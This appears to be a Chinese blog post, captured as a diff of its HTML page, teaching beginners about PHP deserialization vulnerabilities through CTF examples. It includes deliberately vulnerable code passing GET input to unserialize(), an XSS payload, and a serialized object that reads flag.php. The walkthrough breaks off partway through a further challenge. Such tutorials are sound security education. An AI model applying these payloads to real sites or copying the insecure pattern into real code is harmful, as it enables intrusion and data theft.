@@ -1,0 +1,1702 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/favicon.ico?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: true,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  
+
+
+
+
+  <meta name="description" content="文章首发：Freebuf">
+<meta name="keywords" content="CTF,PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="入门Web需要知道的PHP反序列化漏洞">
+<meta property="og:url" content="https://p2hm1n.github.io/2019/06/29/入门Web需要知道的PHP反序列化漏洞/index.html">
+<meta property="og:site_name" content="ONE PIECE">
+<meta property="og:description" content="文章首发：Freebuf">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.loli.net/2019/06/14/5d0340ca34e4c79737.png">
+<meta property="og:image" content="https://i.loli.net/2019/06/14/5d034ebdc52ed44697.png">
+<meta property="og:image" content="https://i.loli.net/2019/06/14/5d034fb38408a57359.png">
+<meta property="og:image" content="https://i.loli.net/2019/06/14/5d035420ede2d21500.png">
+<meta property="og:image" content="https://i.loli.net/2019/06/14/5d035993eee1243980.png">
+<meta property="og:image" content="https://i.loli.net/2019/06/14/5d035ed42d7ab17356.png">
+<meta property="og:image" content="https://i.loli.net/2019/06/14/5d039a4b75b6e64984.png">
+<meta property="og:updated_time" content="2019-06-29T08:58:25.066Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="入门Web需要知道的PHP反序列化漏洞">
+<meta name="twitter:description" content="文章首发：Freebuf">
+<meta name="twitter:image" content="https://i.loli.net/2019/06/14/5d0340ca34e4c79737.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://p2hm1n.github.io/2019/06/29/入门Web需要知道的PHP反序列化漏洞/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>入门Web需要知道的PHP反序列化漏洞 | ONE PIECE</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ONE PIECE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">P2hm1n's blog</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-writing">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/Writing" rel="section"><i class="menu-item-icon fa fa-fw fa-book"></i> <br>随笔</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tools">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tools/" rel="section"><i class="menu-item-icon fa fa-fw fa-flag"></i> <br>工具</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://p2hm1n.github.io/2019/06/29/入门Web需要知道的PHP反序列化漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P2hm1n">
+      <meta itemprop="description" content="ONE PIECE">
+      <meta itemprop="image" content="/images/lufei.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ONE PIECE">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">入门Web需要知道的PHP反序列化漏洞
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-06-29 16:55:08 / 修改时间：16:58:25" itemprop="dateCreated datePublished" datetime="2019-06-29T16:55:08+08:00">2019-06-29</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+            <span id="/2019/06/29/入门Web需要知道的PHP反序列化漏洞/" class="leancloud_visitors" data-flag-title="入门Web需要知道的PHP反序列化漏洞">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读次数：</span>
+              
+                <span class="leancloud-visitors-count"></span>
+            </span>
+          
+
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">13k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">12 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>文章首发：Freebuf</p>
+<a id="more"></a>
+
+<blockquote>
+<p><strong>本文首发：Freebuf</strong> <a href="https://www.freebuf.com/articles/rookie/206249.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/rookie/206249.html</a></p>
+</blockquote>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近才开始学习安全，虽然练习过南邮CTF和Bugku的CTF，但是打各种线上CTF经常不尽人意，因为最近的比赛都有着一个新手入门CTF不常遇到的考点—————反序列化。</p>
+<p>看了很多师傅们，各种前辈们的文章，于是想着总结一下已经学到的东西</p>
+<p>在我当时PHP基本功不怎么扎实的时候，看反序列化就是一脸懵逼，所以我认为在接触反序列化漏洞之前<strong>需要掌握以下内容</strong></p>
+<ol>
+<li><p><a href="https://www.kancloud.cn/webxyl/php_oop/68874" target="_blank" rel="noopener">PHP面向对象</a></p>
+</li>
+<li><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">PHP中的魔术方法</a></p>
+</li>
+<li><p><a href="https://segmentfault.com/a/1190000007250604" target="_blank" rel="noopener">PHP之十六个魔术方法详解</a></p>
+</li>
+</ol>
+<p>看了上面的文章应该就会了类与对象，一些魔术方法（比较重要的有 <code>__wakeup()</code>,<code>__construct()</code>, <code>__destruct()</code>, <code>__toString()</code> </p>
+<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><h2 id="为什么要进行序列化与反序列化？"><a href="#为什么要进行序列化与反序列化？" class="headerlink" title="为什么要进行序列化与反序列化？"></a>为什么要进行序列化与反序列化？</h2><p>起初也是很不理解为什么要费劲周章的去序列化然后反序列化回来，还多了一步操作，看了各种文章，举了各种栗子，无非都是想告诉我们： <strong>序列化的目的是方便数据的传输和存储</strong></p>
+<p>再附上网上看到的一段话</p>
+<blockquote>
+<p>PHP 文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策，总不能你永远不让它销毁，等着你吧，于是人们就想出了一种能长久保存对象的方法，这就是 PHP 的序列化，那当我们下次要用的时候只要反序列化一下就 ok 啦</p>
+</blockquote>
+<br>
+
+<h2 id="什么是序列化和反序列化？"><a href="#什么是序列化和反序列化？" class="headerlink" title="什么是序列化和反序列化？"></a>什么是序列化和反序列化？</h2><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p><strong>关键函数</strong> <code>serialize()</code>:将PHP中创建的对象，变成一个字符串</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $name = <span class="string">'P2hm1n'</span>;  </span><br><span class="line">    <span class="keyword">private</span> $sex = <span class="string">'secret'</span>;  </span><br><span class="line">    <span class="keyword">protected</span> $age = <span class="string">'20'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test1 = <span class="keyword">new</span> test();</span><br><span class="line">$object = serialize($test1);</span><br><span class="line">print_r($object);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/06/14/5d0340ca34e4c79737.png" alt></p>
+<p>经过查阅资料我们发现</p>
+<p><strong>private属性序列化的时候格式是 <code>%00类名%00成员名</code></strong></p>
+<p><strong>protected属性序列化的时候格式是 <code>%00*%00成员名</code></strong></p>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p><strong>关键函数</strong> <code>unserialize()</code>:将经过序列化的字符串转换回PHP值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$object = <span class="string">'经过序列化的字符串'</span>;</span><br><span class="line">$test = unserialize($object1);</span><br><span class="line">print_r($test3);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：当有 protected 和 private 属性的时候记得补齐空的字符串</strong></p>
+<h2 id="为什么会产生反序列化漏洞？"><a href="#为什么会产生反序列化漏洞？" class="headerlink" title="为什么会产生反序列化漏洞？"></a>为什么会产生反序列化漏洞？</h2><p>PHP反序列化漏洞又称PHP对象注入，是因为程序对输入数据处理不当导致的</p>
+<ul>
+<li>需要具备反序列化漏洞的前提：<ul>
+<li>必须有 unserailize() 函数</li>
+<li>unserailize() 函数的参数必须可控（为了成功达到控制你输入的参数所实现的功能，可能需要绕过一些魔法函数</li>
+</ul>
+</li>
+</ul>
+<p>下面写一个小栗子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $target = <span class="string">'this is a test'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;target;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'b'</span>];</span><br><span class="line">$c = unserialize($a);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/06/14/5d034ebdc52ed44697.png" alt></p>
+<p>上面的栗子就具备了利用反序列化漏洞的前提，因为存在 <code>echo</code> 的原因，我们还可以直接利用xss</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $target = <span class="string">'&lt;script&gt;alert(/xss/);&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> test();</span><br><span class="line">$a = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/06/14/5d034fb38408a57359.png" alt></p>
+<h2 id="很简单的栗子"><a href="#很简单的栗子" class="headerlink" title="很简单的栗子"></a>很简单的栗子</h2><h3 id="D0g3平台"><a href="#D0g3平台" class="headerlink" title="D0g3平台"></a>D0g3平台</h3><p>一道实验室师傅们出的题：</p>
+<p><a href="http://120.79.33.253:9001/" target="_blank" rel="noopener">http://120.79.33.253:9001/</a></p>
+<p>题目直接给了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$KEY = <span class="string">"D0g3!!!"</span>;</span><br><span class="line">$str = $_GET[<span class="string">'str'</span>];</span><br><span class="line"><span class="keyword">if</span> (unserialize($str) === <span class="string">"$KEY"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到判断条件 <code>unserialize($str) === &quot;$KEY&quot;</code>就会输出flag，且具备了反序列化漏洞的一条：有 <code>unserialize()</code>函数，那么寻找str参数是否可控，向上寻找发现 <code>$str = $_GET[&#39;str&#39;];</code> ，通过 GET 型传参，参数可控。这里也就具备了反序列化的两个条件，所以我们直接构造</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$KEY = <span class="string">"D0g3!!!"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($KEY)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/06/14/5d035420ede2d21500.png" alt></p>
+<h3 id="Bugku-welcome-to-the-bugkuctf"><a href="#Bugku-welcome-to-the-bugkuctf" class="headerlink" title="Bugku-welcome to the bugkuctf"></a>Bugku-welcome to the bugkuctf</h3><p><img src="https://i.loli.net/2019/06/14/5d035993eee1243980.png" alt></p>
+<p>在经历了前面的php伪协议的考点之后，经过base64解码拿到了两个源码</p>
+<ul>
+<li>index.php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>hint.php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>观察到危险函数 <code>unserialize()</code>,跟进一下 hint.php 里有有一个 <code>file_get_contents()</code>函数，可以读取到文件，那么我们只需要观察file是否可控便可轻松解题</p>
+<p>因此我们只需要控制 <code>$this-&gt;file</code> 就能读到我们想要的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file = &apos;flag.php&apos;; </span><br><span class="line">&#125;</span><br><span class="line">$a = new Flag();</span><br><span class="line">$a = serialize($a);</span><br><span class="line">echo $a;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>当然这道题不只考了反序列化，还需要一些其他操作才能拿到flag</p>
+<p><img src="https://i.loli.net/2019/06/14/5d035ed42d7ab17356.png" alt></p>
+<blockquote>
+<p>上面的简单栗子都是直接可以通过序列化生成相应的payload然后再反序列化之后实现功能，但是通常不会这么简单的就让你利用成功，所以需要掌握下面的一些东西</p>
+</blockquote>
+<h2 id="一些魔术方法"><a href="#一些魔术方法" class="headerlink" title="一些魔术方法"></a>一些魔术方法</h2><p>在绕过魔术方法之前我们需要了解一些魔术方法的运行机制————<a href="https://segmentfault.com/a/1190000007250604" target="_blank" rel="noopener">PHP之十六个魔术方法详解</a></p>
+<p>需要了解一下相对于来说重要函数的运行先后顺序</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $name = <span class="string">'P2hm1n'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__construct()"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__destruct()"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__wakeup()"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"__toString()"</span>.<span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__sleep()"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">"name"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$test1 = <span class="keyword">new</span> test();</span><br><span class="line">$test2 = serialize($test1);</span><br><span class="line">$test3 = unserialize($test2);</span><br><span class="line"><span class="keyword">print</span>($test3);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/06/14/5d039a4b75b6e64984.png" alt></p>
+<br>
+
+<p><strong>可以绕过的__weakup()</strong></p>
+<p>实际上是一个CVE漏洞，<strong>CVE-2016-7124</strong>。当成员属性数目<strong>大于</strong>实际数目时会跳过__wakeup的执行。</p>
+<p>网上已经有很多讲解了…比如网上的一篇文章 <a href="https://blog.csdn.net/qq_19876131/article/details/52890854" target="_blank" rel="noopener">https://blog.csdn.net/qq_19876131/article/details/52890854</a> 就写的比较清楚，我们只需要知道成员数目<strong>大于</strong>实际数目这个利用的点就行了</p>
+<h1 id="盘点近期两道有关反序列化题"><a href="#盘点近期两道有关反序列化题" class="headerlink" title="盘点近期两道有关反序列化题"></a>盘点近期两道有关反序列化题</h1><h2 id="第12届全国大学生信息安全竞赛-JustSoso"><a href="#第12届全国大学生信息安全竞赛-JustSoso" class="headerlink" title="第12届全国大学生信息安全竞赛-JustSoso"></a>第12届全国大学生信息安全竞赛-JustSoso</h2><p>PHP伪协议+base64解码得到两个文件</p>
+<ul>
+<li>index.php</li>
+</ul>
